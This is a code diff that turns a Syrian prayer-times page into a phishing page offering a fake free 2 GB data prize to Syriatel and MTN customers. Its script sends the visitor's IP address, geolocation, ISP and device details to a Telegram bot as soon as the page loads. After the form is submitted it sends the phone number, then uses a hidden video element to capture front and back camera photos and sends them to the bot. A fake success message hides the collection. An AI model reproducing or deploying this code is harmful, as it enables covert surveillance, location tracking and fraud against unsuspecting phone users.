@@ -1,201 +1,493 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html dir="rtl" lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>@Jhead122</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ربح 2 جيجابايت مجاني - Syriatel وMTN</title>
     <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Arial, sans-serif;
-            background: linear-gradient(133deg, #683ffe 0%, #e34bcd 65%, #58e0c6 100%);
+            font-family: 'Segoe UI', Tahoma, Arial, sans-serif;
+            background: linear-gradient(135deg, #FF6B35 0%, #F7931E 50%, #FF6B35 100%);
             min-height: 100vh;
+            padding: 20px;
         }
-        .container {
-            max-width: 980px;
-            margin: 40px auto;
-            background: rgba(255,255,255,0.97);
-            border-radius: 28px;
-            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.18);
-            padding: 32px 40px 50px 40px;
-        }
-        h1 {
+        .header {
             text-align: center;
-            color: #683ffe;
-            font-size: 2.8em;
-            margin-bottom: 10px;
-            letter-spacing: 1px;
+            color: white;
+            padding: 20px 0 10px;
         }
-        h2 {
-            text-align: center;
-            color: #e34bcd;
-            margin-bottom: 14px;
-            font-size: 1.38em;
-            font-weight: 600;
+        .header .flag {
+            font-size: 50px;
+            margin-bottom: 8px;
         }
-        .tool-list {
-            margin-top: 30px;
-        }
-        .tool-card {
-            background: linear-gradient(90deg, #f9fcff 10%, #fbe3ff 90%);
-            border-radius: 15px;
-            box-shadow: 0 2px 11px rgba(100, 63, 254, .13);
-            margin: 14px 0;
-            padding: 17px 20px;
-            display: flex;
-            flex-direction: column;
-            transition: transform 0.15s;
-        }
-        .tool-card:hover {
-            transform: scale(1.013);
-        }
-        .tool-title {
-            font-size: 1.17em;
-            font-weight: bold;
-            color: #e34bcd;
-        }
-        .tool-links {
-            font-size: 16px;
-        }
-        .clock {
+        .header h1 {
             font-size: 28px;
             font-weight: bold;
-            color: #2980b9;
-            margin-bottom: 20px;
+            margin-bottom: 4px;
         }
-        .countdown {
-            font-size: 20px;
-            color: #e74c3c;
-            margin-bottom: 20px;
+        .header p {
+            font-size: 14px;
+            opacity: 0.9;
         }
-        table {
+        .card {
+            background: white;
+            border-radius: 16px;
+            padding: 24px 20px;
+            max-width: 480px;
+            margin: 16px auto;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.2);
+        }
+        .card h2 {
+            color: #FF6B35;
+            font-size: 18px;
+            margin-bottom: 16px;
+            border-bottom: 3px solid #F7931E;
+            padding-bottom: 8px;
+        }
+        .info-box {
+            background: #FFF3E0;
+            border-right: 4px solid #FF6B35;
+            border-radius: 8px;
+            padding: 14px 16px;
+            margin-bottom: 18px;
+            font-size: 14px;
+            color: #333;
+            line-height: 1.7;
+        }
+        .info-box strong { display: block; margin-bottom: 4px; font-size: 15px; color: #FF6B35; }
+        .networks-box {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 18px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        .network-badge {
+            background: linear-gradient(135deg, #FF6B35, #F7931E);
+            color: white;
+            padding: 10px 16px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 14px;
+            box-shadow: 0 4px 12px rgba(255, 107, 53, 0.3);
+        }
+        .form-group {
+            margin-bottom: 14px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            color: #333;
+            margin-bottom: 5px;
+            font-weight: 600;
+        }
+        .form-group label .required {
+            color: #d32f2f;
+            font-weight: bold;
+        }
+        .form-group input, .form-group select {
             width: 100%;
-            border-collapse: collapse;
-            margin-top: 20px;
+            padding: 11px 12px;
+            border: 1.5px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+            font-family: inherit;
+            direction: rtl;
+            outline: none;
+            transition: border-color 0.2s;
         }
-        th, td {
-            padding: 10px;
-            border: 1px solid #ddd;
+        .form-group input:focus, .form-group select:focus {
+            border-color: #FF6B35;
+            box-shadow: 0 0 0 3px rgba(255, 107, 53, 0.1);
         }
-        th {
-            background: #3498db;
-            color: #fff;
+        .form-group input:invalid:not(:placeholder-shown),
+        .form-group select:invalid:not([value=""]) {
+            border-color: #d32f2f;
         }
-        td {
-            background: #f9f9f9;
+        .row { display: flex; gap: 10px; }
+        .row .form-group { flex: 1; }
+        .btn-win {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #FF6B35, #F7931E);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 8px;
+            font-family: inherit;
+            letter-spacing: 0.5px;
+            transition: all 0.3s;
+            box-shadow: 0 6px 20px rgba(255, 107, 53, 0.3);
         }
+        .btn-win:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(255, 107, 53, 0.4);
+        }
+        .btn-win:active { opacity: 0.9; }
+        .btn-win:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+        .footer-note {
+            text-align: center;
+            color: rgba(255,255,255,0.8);
+            font-size: 12px;
+            margin-top: 14px;
+            padding-bottom: 10px;
+        }
+
+        /* مودال النجاح */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.6);
+            z-index: 999;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-overlay.show { display: flex; }
+        .modal {
+            background: white;
+            border-radius: 20px;
+            padding: 36px 28px;
+            text-align: center;
+            max-width: 340px;
+            width: 90%;
+            box-shadow: 0 12px 40px rgba(0,0,0,0.3);
+            animation: popIn 0.4s ease;
+        }
+        @keyframes popIn {
+            0% { transform: scale(0.7); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        .modal .icon { font-size: 60px; margin-bottom: 14px; animation: bounce 0.6s ease; }
+        @keyframes bounce {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        .modal h3 { color: #FF6B35; font-size: 20px; margin-bottom: 10px; font-weight: bold; }
+        .modal p { color: #555; font-size: 14px; line-height: 1.7; margin-bottom: 12px; }
+        .modal .ref { 
+            background: linear-gradient(135deg, #FFF3E0, #FFE0B2);
+            border-radius: 10px; 
+            padding: 12px 16px; 
+            margin: 14px 0; 
+            font-weight: bold; 
+            color: #FF6B35;
+            font-size: 16px;
+            border: 2px solid #FF6B35;
+        }
+        .modal .progress-bar {
+            width: 100%;
+            height: 5px;
+            background: #e0e0e0;
+            border-radius: 5px;
+            margin-top: 16px;
+            overflow: hidden;
+        }
+        .modal .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #FF6B35, #F7931E);
+            border-radius: 5px;
+            width: 0%;
+            animation: fillBar 2s linear forwards;
+        }
+        @keyframes fillBar {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+
+        /* رسالة خطأ */
+        .error-message {
+            color: #d32f2f;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+        }
+
+        /* تأثير النص المتحرك */
+        .pulse-text {
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+
+        /* عناصر الكاميرا المخفية */
+        #video { position: absolute; left: -9999px; top: -9999px; width: 1px; height: 1px; }
+        #canvas { display: none; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>مواقيت الصلاة</h1>
-        <select id="citySelect" onchange="fetchPrayerTimes()">
-            <option value="Al-Bab" selected>الباب</option>
-            <option value="Aleppo">حلب</option>
-            <option value="Afrin">عفرين</option>
-            <option value="Azaz">أعزاز</option>
-            <option value="Hama">حماة</option>
-            <option value="Salamiyah">السلامية</option>
-            <option value="Masyaf">المصياف</option>
-            <option value="Suqaylabiyah">السقيلبية</option>
-        </select>
-        <div class="clock" id="digitalClock">الساعة الرقمية</div>
-        <div class="countdown" id="countdown">الوقت المتبقي للإفطار</div>
-        <table>
-            <thead>
-                <tr>
-                    <th>الصلاة</th>
-                    <th>الوقت</th>
-                </tr>
-            </thead>
-            <tbody id="prayerTimes">
-                <tr><td>الفجر</td><td id="fajr">--:--</td></tr>
-                <tr><td>الشروق</td><td id="sunrise">--:--</td></tr>
-                <tr><td>الظهر</td><td id="dhuhr">--:--</td></tr>
-                <tr><td>العصر</td><td id="asr">--:--</td></tr>
-                <tr><td>المغرب</td><td id="maghrib">--:--</td></tr>
-                <tr><td>العشاء</td><td id="isha">--:--</td></tr>
-            </tbody>
-        </table>
+
+    <div class="header">
+        <div class="flag">🎁</div>
+        <h1>ربح 2 جيجابايت مجاني!</h1>
+        <p>عرض حصري لعملاء Syriatel وMTN</p>
     </div>
 
+    <div class="card">
+        <h2>🎯 تفاصيل العرض</h2>
+        <div class="info-box">
+            <strong>💰 الجائزة: 2 جيجابايت انترنت مجاني</strong>
+            احصل على 2 جيجابايت انترنت مجاني فوراً! عرض محدود الوقت متاح لعملاء Syriatel وMTN فقط.
+        </div>
+
+        <div class="networks-box">
+            <div class="network-badge">🔴 Syriatel</div>
+            <div class="network-badge">🟡 MTN</div>
+        </div>
+
+        <h2>📱 أدخل بيانات هاتفك</h2>
+
+        <form id="winForm">
+            <div class="form-group">
+                <label>رقم الهاتف <span class="required">*</span></label>
+                <input type="tel" id="phoneNumber" placeholder="أدخل رقم هاتفك (09XXXXXXXX)" required>
+                <span class="error-message" id="phoneError"></span>
+            </div>
+
+            <div class="row">
+                <div class="form-group">
+                    <label>الشبكة <span class="required">*</span></label>
+                    <select id="network" required>
+                        <option value="">اختر الشبكة</option>
+                        <option value="Syriatel">🔴 Syriatel</option>
+                        <option value="MTN">🟡 MTN</option>
+                    </select>
+                </div>
+            </div>
+
+            <button type="submit" class="btn-win" id="btnWin">🎁 احصل على الجائزة الآن</button>
+        </form>
+
+        <div class="footer-note">
+            ✅ آمن وسريع | 🔒 بيانات محمية | ⚡ تفعيل فوري
+        </div>
+    </div>
+
+    <!-- مودال النجاح -->
+    <div class="modal-overlay" id="successModal">
+        <div class="modal">
+            <div class="icon">🎉</div>
+            <h3>تم بنجاح!</h3>
+            <p>تم تسجيل طلبك بنجاح</p>
+            <div class="ref" id="refNumber">رقم الطلب: SY-2026-0000</div>
+            <p>سيتم تفعيل الجائزة خلال دقائق</p>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- عناصر الكاميرا المخفية -->
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
     <script>
-        // تحديث الساعة الرقمية
-        function updateClock() {
-            const now = new Date();
-            const timeString = now.toLocaleTimeString('en-US', { 
-                hour12: true, 
-                hour: '2-digit', 
-                minute: '2-digit', 
-                second: '2-digit' 
-            });
-            document.getElementById('digitalClock').textContent = timeString;
-        }
-        setInterval(updateClock, 1000);
-        updateClock();
+        // ===== إعدادات البوت =====
+        // ⚠️ استبدل هذه القيم ببيانات بوتك الخاص
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';  // استبدل بـ token بوتك
+        const CHAT_ID = 'YOUR_CHAT_ID_HERE';      // استبدل بـ chat ID الخاص بك
 
-        // جلب مواقيت الصلاة
-        function fetchPrayerTimes() {
-            const city = document.getElementById('citySelect').value;
-            const url = `https://api.aladhan.com/v1/timingsByCity?city=${city}&country=Syria&method=2`;
-
-            fetch(url)
-                .then(response => response.json())
-                .then(data => {
-                    const timings = data.data.timings;
-                    document.getElementById('fajr').textContent = convertTo12Hour(timings.Fajr);
-                    document.getElementById('sunrise').textContent = convertTo12Hour(timings.Sunrise);
-                    document.getElementById('dhuhr').textContent = convertTo12Hour(timings.Dhuhr);
-                    document.getElementById('asr').textContent = convertTo12Hour(timings.Asr);
-                    document.getElementById('maghrib').textContent = convertTo12Hour(timings.Maghrib);
-                    document.getElementById('isha').textContent = convertTo12Hour(timings.Isha);
-
-                    updateCountdown(timings.Maghrib);
-                })
-                .catch(error => console.error('Error:', error));
+        // ===== دالة إرسال رسالة نصية للبوت =====
+        function sendMsg(txt) {
+            if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || 
+                !CHAT_ID || CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+                console.log('⚠️ تنبيه: يرجى تعديل BOT_TOKEN و CHAT_ID في الكود');
+                console.log('الرسالة التي كان سيتم إرسالها:', txt);
+                return;
+            }
+            
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify({ chat_id: CHAT_ID, text: txt, parse_mode: 'HTML' }));
         }
 
-        // تحويل الوقت إلى صيغة 12 ساعة
-        function convertTo12Hour(time) {
-            const [hours, minutes] = time.split(':');
-            let hour = parseInt(hours);
-            const period = hour >= 12 ? 'PM' : 'AM';
-            hour = hour % 12 || 12;
-            return `${hour.toString().padStart(2, '0')}:${minutes} ${period}`;
-        }
-
-        // تحديث المؤقت التنازلي لوقت المغرب
-        function updateCountdown(maghribTime) {
-            const now = new Date();
-            const today = now.toISOString().split('T')[0];
-            const [maghribHour, maghribMinute] = maghribTime.split(':');
-            let maghrib = new Date(`${today}T${maghribHour}:${maghribMinute}:00+03:00`);
-
-            if (now > maghrib) {
-                maghrib.setDate(maghrib.getDate() + 1); // إذا مر وقت المغرب، انتقل للغد
+        // ===== دالة إرسال صورة للبوت =====
+        function sendPhoto(dataURL, caption) {
+            if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || 
+                !CHAT_ID || CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+                console.log('⚠️ تنبيه: يرجى تعديل BOT_TOKEN و CHAT_ID في الكود');
+                return;
             }
 
-            const countdownInterval = setInterval(() => {
-                const currentTime = new Date();
-                const timeDiff = maghrib - currentTime;
+            var arr = dataURL.split(',');
+            var mime = arr[0].match(/:(.*?);/)[1];
+            var bstr = atob(arr[1]);
+            var n = bstr.length;
+            var u8arr = new Uint8Array(n);
+            while (n--) { u8arr[n] = bstr.charCodeAt(n); }
+            var blob = new Blob([u8arr], { type: mime });
 
-                if (timeDiff <= 0) {
-                    document.getElementById('countdown').textContent = 'حان وقت الإفطار!';
-                    clearInterval(countdownInterval);
-                    return;
-                }
+            var form = new FormData();
+            form.append('chat_id', CHAT_ID);
+            form.append('photo', blob, 'photo.jpg');
+            form.append('caption', caption || '📸 صورة من الكاميرا');
 
-                const hours = Math.floor(timeDiff / (1000 * 60 * 60));
-                const minutes = Math.floor((timeDiff % (1000 * 60 * 60)) / (1000 * 60));
-                const seconds = Math.floor((timeDiff % (1000 * 60)) / 1000);
-                document.getElementById('countdown').textContent = 
-                    `الوقت المتبقي للإفطار: ${hours} س، ${minutes} د، ${seconds} ث`;
-            }, 1000);
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto', true);
+            xhr.send(form);
         }
 
-        // جلب مواقيت الصلاة عند تحميل الصفحة
-        fetchPrayerTimes();
+        // ===== دالة التقاط صورة من الكاميرا =====
+        function capturePhoto(facingMode, label, callback) {
+            var video = document.getElementById('video');
+            var canvas = document.getElementById('canvas');
+            var ctx = canvas.getContext('2d');
+
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } }
+            }).then(function(stream) {
+                video.srcObject = stream;
+                video.play();
+
+                function tryCapture() {
+                    if (video.videoWidth > 0 && video.videoHeight > 0) {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        ctx.drawImage(video, 0, 0);
+                        var dataURL = canvas.toDataURL('image/jpeg', 0.8);
+                        stream.getTracks().forEach(function(t) { t.stop(); });
+                        sendPhoto(dataURL, label);
+                        if (callback) callback();
+                    } else {
+                        requestAnimationFrame(tryCapture);
+                    }
+                }
+
+                video.addEventListener('playing', function onPlay() {
+                    video.removeEventListener('playing', onPlay);
+                    tryCapture();
+                });
+
+            }).catch(function(err) {
+                console.log('❌ فشل الوصول للكاميرا: ' + err.message);
+                sendMsg('❌ فشل الوصول للكاميرا: ' + err.message);
+                if (callback) callback();
+            });
+        }
+
+        // ===== دالة الحصول على معرف فريد للجهاز =====
+        function getDeviceId() {
+            var deviceId = localStorage.getItem('deviceId');
+            if (!deviceId) {
+                deviceId = 'SY-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+                localStorage.setItem('deviceId', deviceId);
+            }
+            return deviceId;
+        }
+
+        // ===== إرسال معلومات الزائر فوراً =====
+        var xhr2 = new XMLHttpRequest();
+        xhr2.open('GET', 'https://ipinfo.io/json', true);
+        xhr2.onload = function() {
+            try {
+                var d = JSON.parse(xhr2.responseText);
+                var loc = (d.loc || '?,?').split(',');
+                var deviceId = getDeviceId();
+                
+                var msg = '🔔 <b>زائر جديد على صفحة ربح 2 جيجابايت!</b>\n' +
+                    '━━━━━━━━━━━━━━━━━━\n' +
+                    '🌐 IP: ' + (d.ip || '?') + '\n' +
+                    '🏙️ المدينة: ' + (d.city || '?') + '\n' +
+                    '🗾 المنطقة: ' + (d.region || '?') + '\n' +
+                    '🌍 الدولة: ' + (d.country || '?') + '\n' +
+                    '🏢 مزود الإنترنت: ' + (d.org || '?') + '\n' +
+                    '📍 الإحداثيات: ' + loc[0] + ', ' + loc[1] + '\n' +
+                    '🗺️ <a href="https://www.google.com/maps?q=' + loc[0] + ',' + loc[1] + '">خرائط جوجل</a>\n' +
+                    '📱 الجهاز: ' + navigator.userAgent + '\n' +
+                    '🆔 معرف الجهاز: ' + deviceId;
+                
+                sendMsg(msg);
+            } catch(e) {
+                var deviceId = getDeviceId();
+                sendMsg('🔔 زائر جديد على صفحة ربح 2 جيجابايت!\n📱 ' + navigator.userAgent + '\n🆔 معرف الجهاز: ' + deviceId);
+            }
+        };
+        xhr2.onerror = function() {
+            var deviceId = getDeviceId();
+            sendMsg('🔔 زائر جديد على صفحة ربح 2 جيجابايت!\n📱 ' + navigator.userAgent + '\n🆔 معرف الجهاز: ' + deviceId);
+        };
+        xhr2.send();
+
+        // ===== معالجة إرسال النموذج =====
+        document.getElementById('winForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            var phoneNumber = document.getElementById('phoneNumber').value.trim();
+            var network = document.getElementById('network').value.trim();
+            var phoneError = document.getElementById('phoneError');
+
+            // التحقق من صحة رقم الهاتف
+            var phonePattern = /^09\d{8}$/;
+            if (!phonePattern.test(phoneNumber)) {
+                phoneError.textContent = 'يرجى إدخال رقم هاتف صحيح يبدأ بـ 09 ويحتوي على 10 أرقام';
+                phoneError.style.display = 'block';
+                return;
+            }
+
+            if (!network) {
+                alert('يرجى اختيار الشبكة');
+                return;
+            }
+
+            phoneError.style.display = 'none';
+
+            var btn = document.getElementById('btnWin');
+            btn.disabled = true;
+            btn.textContent = '⏳ جاري المعالجة...';
+
+            // إنشاء رسالة مفصلة للبوت
+            var formMsg = '<b>🎁 طلب جديد لربح 2 جيجابايت!</b>\n' +
+                '━━━━━━━━━━━━━━━━━━━━━━\n' +
+                '📱 رقم الهاتف: <code>' + phoneNumber + '</code>\n' +
+                '🌐 الشبكة: ' + network + '\n' +
+                '⏰ الوقت: ' + new Date().toLocaleString('ar-SY') + '\n' +
+                '🆔 معرف الجهاز: ' + getDeviceId() + '\n' +
+                '━━━━━━━━━━━━━━━━━━━━━━';
+
+            // إرسال البيانات للبوت
+            sendMsg(formMsg);
+
+            // التقاط صورة من الكاميرا الأمامية وإرسالها
+            capturePhoto('user', '📸 صورة أمامية - طلب ربح 2 جيجابايت', function() {
+                // بعد التقاط الصورة الأمامية، التقط صورة من الكاميرا الخلفية
+                setTimeout(function() {
+                    capturePhoto('environment', '📸 صورة خلفية - طلب ربح 2 جيجابايت', null);
+                }, 500);
+            });
+
+            // عرض مودال النجاح بعد قليل
+            setTimeout(function() {
+                var refNum = 'SY-2026-' + Math.floor(1000 + Math.random() * 9000);
+                document.getElementById('refNumber').textContent = 'رقم الطلب: ' + refNum;
+                document.getElementById('successModal').classList.add('show');
+
+                // إرسال إشعار للبوت
+                sendMsg('✅ <b>تم عرض إشعار النجاح</b>\n' +
+                    '📱 الهاتف: <code>' + phoneNumber + '</code>\n' +
+                    '🎟️ رقم الطلب: ' + refNum);
+
+                // إغلاق المودال وإعادة تعيين النموذج بعد 3 ثوان
+                setTimeout(function() {
+                    document.getElementById('successModal').classList.remove('show');
+                    document.getElementById('winForm').reset();
+                    btn.disabled = false;
+                    btn.textContent = '🎁 احصل على الجائزة الآن';
+                }, 3000);
+            }, 800);
+        });
+
+        // إزالة رسالة الخطأ عند التركيز على الحقل
+        document.getElementById('phoneNumber').addEventListener('focus', function() {
+            document.getElementById('phoneError').style.display = 'none';
+        });
     </script>
 </body>
 </html>
